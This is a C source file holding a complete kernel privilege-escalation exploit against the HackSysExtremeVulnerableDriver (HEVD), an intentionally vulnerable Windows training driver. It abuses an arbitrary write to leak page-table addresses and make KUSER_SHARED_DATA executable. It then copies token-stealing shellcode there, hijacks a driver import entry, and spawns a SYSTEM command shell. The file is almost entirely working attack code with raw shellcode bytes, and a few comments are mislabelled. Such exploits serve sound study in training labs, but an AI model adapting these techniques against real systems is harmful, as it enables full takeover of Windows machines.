#include <stdio.h>
#include <windows.h>
#include <Psapi.h>

#define ARRAY_SIZE 1024
#define IO_CODE_AMO 0x22200B
#define IO_CODE_UAF 0x222013

// Function used to retrieve the kernel address of a specified image
DWORD64 getKernel(char string[]){
    LPVOID lpImageBase[ARRAY_SIZE];
    DWORD lpcbNeeded;
    int drivers;

    char lpFileName[ARRAY_SIZE];
    DWORD64 imageBase;

    EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
    drivers = lpcbNeeded / sizeof(lpImageBase[0]);
    int counter = drivers;

    for(int i = 0; i < drivers; i++){
        GetDeviceDriverBaseNameA(lpImageBase[i], lpFileName, sizeof(lpFileName) / sizeof(char));
	if(!strcmp(string, lpFileName)){
	    printf("[+] Address of %s image at: 0x%llX\n", string, lpImageBase[i]);
	    imageBase = (DWORD64)lpImageBase[i];
	    break;
	}
	else{
	    counter--;
	    if(counter == 0)
	        printf("[-] Error - %s Image not found!\n", string);
	}
    }
	return imageBase;
}

// Function used to calculate PTE Address of the specified memory region
DWORD64 getPte(DWORD64 pteBaseAddr, DWORD64 address){
    DWORD64 tokenPte;

    printf("[+] Calculating PTE for specified memory region at 0x%llX..\n", address);
    printf("[+] Step 1: Shifting address of memory region 9 bits right..\n");
    tokenPte = address >> 9;
    printf("[+] Step 2: Performing bitwise AND assignment with '0x7FFFFFFFF8'..\n");
    tokenPte &= 0x7FFFFFFFF8;
    printf("[+] Step 3: Adding base address of PTEs..\n");
    tokenPte += pteBaseAddr;
    return tokenPte;
}

// Function used to setup lpInBuffer/nInBufferSize and interact with HEVD driver
void interact(HANDLE handle, DWORD64 what, DWORD64* where){
    DWORD bytesRetn;
    char expl[0x10];

    memset(expl, 'A', 0x10);
    memcpy(&expl, &what, 0x8);
    memcpy(&expl[0x8], &where, 0x8);

    printf("[+] Starting interaction with the driver..\n");
    DeviceIoControl(handle, IO_CODE_AMO, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);
}

// Function used to trigger a call to HEVD+0x2010
void trigger(HANDLE handle){
    DWORD bytesRetn;
    char expl[0x8];

    memset(expl, 0x90, 0x8);

    printf("[+] Starting interaction with the driver..\n");
    DeviceIoControl(handle, IO_CODE_UAF, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);
}

int main(void){
    // Open a handle to the HEVD driver object
    printf("[+] Calling CreateFileA() to obtain a handle to the driver..\n");
    HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Error - Unable to obtain a handle to the driver.\n");
        exit(1);
    }
    printf("[+] Successfully obtained a handle to the driver.\n");

	DWORD64 hevdBase = getKernel("HEVD.sys");
	DWORD64 kernelBase = getKernel("ntoskrnl.exe");
	DWORD64 miGetPte = kernelBase + 0x29CC23;
	printf("[+] Address of MiGetPteAddress+0x13: 0x%llX\n", miGetPte);

    // Retrieve the value stored in nt!MiGetPteAddress+013
    DWORD64 placeholder = 0;
    DWORD64* basePte = &placeholder;
    interact(hDriver, miGetPte, basePte);
    DWORD64 pteBase = *basePte;
    printf("[+] Successfully leaked the base address for PTEs: 0x%llX\n", pteBase);

    // Calculate the PTE address for memory region of KUser_Shared_Data+0x800
    DWORD64 KUser_Shared_Data[9] = { 0xFFFFF78000000800, 0xFFFFF78000000808, 0xFFFFF78000000810, 0xFFFFF78000000818, 0xFFFFF78000000820,
				0xFFFFF78000000828, 0xFFFFF78000000830, 0xFFFFF78000000838, 0xFFFFF78000000840 };
    DWORD64 kUserSDPteAddr = getPte(pteBase, KUser_Shared_Data[0]);
    printf("[+] Found PTE for KUser_Shared_Data+0x800 at: 0x%llX\n", kUserSDPteAddr);

    // Retrieve the value stored in the PTE address of KUser_Shared_Data+0x800
    placeholder = 0;
    DWORD64* bitsPteTokenK = &placeholder;
    interact(hDriver, kUserSDPteAddr, bitsPteTokenK);
    DWORD64 pteControlBits = *bitsPteTokenK;
    printf("[+] Identified PTE control bits for KUser_Shared_Data+0x800: %llX\n", pteControlBits);

    // Update the Value stored in the PTE address of KUser_Shared_Data+0x800
    DWORD64 taintedPte = pteControlBits & 0x0FFFFFFFFFFFFFFF;
    DWORD64* taintedControlBits = &taintedPte;
    printf("[+] Modifying KUser_Shared_Data+0x800 PTE bitmask to be Executable..\n");
    interact(hDriver, (DWORD64)taintedControlBits, (DWORD64*)kUserSDPteAddr);
    printf("[+] Successfully updated PTE control bits for KUser_Shared_Data+0x800 at %llX to: %016llx\n", kUserSDPteAddr, taintedPte);
    printf("[+] Beginning to store LPE payload at KUser_Shared_Data+0x800..\n");

    // Copy tokenstealing LPE shellcode into KUser_Shared_Data+0x800
    DWORD64 lpeShellcode[9] = { 0x00018825048B4865, 0x000000B8808B4800, 0x04489B8B48C38948, 0x000448EB81480000, 0x000004408B8B4800,
   			   0x8B48E57504F98348, 0xF0E180000004B88B, 0x48000004B8888948, 0x0000000000C3C031 };
    DWORD64* pointerShellcode;
    pointerShellcode = lpeShellcode;

    for(int i = 0; i < 9; i++){
        interact(hDriver, (DWORD64)pointerShellcode, (DWORD64*)KUser_Shared_Data[i]);
	printf("[+] The following has been copied to 0x%llX: 0x%016llx\n", KUser_Shared_Data[i], *pointerShellcode);
	pointerShellcode++;
    }
    printf("[+] Successfully copied LPE payload into KUser_Shared_Data..\n");

    // Calculate the PTE address for memory region of HEVD+0x2010 (nt!ExAllocatePoolWithTag)
    DWORD64 hevdIat = hevdBase + 0x2010;
    DWORD64 hevdIatPte = getPte(pteBase, hevdIat);
    printf("[+] Found PTE for HEVD+0x2010 at: 0x%llX\n", hevdIatPte);

    // Retrieve the value stored in the PTE address of HEVD+0x2010
    placeholder = 0;
    DWORD64* iatPteHevd = &placeholder;
    interact(hDriver, hevdIatPte, iatPteHevd);
    DWORD64 iatControlBits = *iatPteHevd;
    printf("[+] Identified PTE control bits for KUser_Shared_Data+0x800: %llX\n", iatControlBits);

    // Update the Value stored in the PTE address of KUser_Shared_Data+0x800
    DWORD64 taintedIatPte = iatControlBits & 0x0FFFFFFFFFFFFFFF;
    taintedIatPte = iatControlBits + 2;
    DWORD64* taintedIatControlBits = &taintedIatPte;
    printf("[+] Modifying KUser_Shared_Data+0x800 PTE bitmask to be Executable..\n");
    interact(hDriver, (DWORD64)taintedIatControlBits, (DWORD64*)hevdIatPte);
    printf("[+] Successfully updated PTE control bits for KUser_Shared_Data+0x800 at %llX to: %016llx\n", hevdIatPte, taintedIatPte);

    // Update IAT at HEVD+0x2010
    printf("[+] Updating IAT at HEVD+0x2010 to point to KUser_Shared_Data+0x800..\n");
    DWORD64* kUserSDpointer = &KUser_Shared_Data[0];
    interact(hDriver, (DWORD64)kUserSDpointer, (DWORD64*)hevdIat);
    printf("[+] Successfully updated IAT at HEVD+0x2010 to point to KUser_Shared_Data+0x800..\n");

    // Trigger call to HEVD+0x2010
    printf("[+] Triggering a call to HEVD+0x2010..\n");
    trigger(hDriver);
    system("cmd.exe");

    CloseHandle(hDriver);
    return 0;
}
